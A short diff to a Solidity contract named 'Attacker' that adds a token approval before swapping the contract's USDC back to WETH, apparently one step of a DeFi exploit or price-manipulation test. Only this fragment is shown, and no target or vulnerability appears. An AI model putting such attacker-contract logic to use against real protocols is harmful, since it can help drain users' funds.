@@ -50,6 +50,7 @@ contract Attacker {
         // Now just do the swap in the opposite direction
         // need our USDC balance, swap it all back
         uint swapAmount = IERC20(usdc).balanceOf(address(this));
+        IERC20(usdc).approve(router, swapAmount);
         address[] memory path = new address[](2);
         path[0] = usdc;
         path[1] = weth;
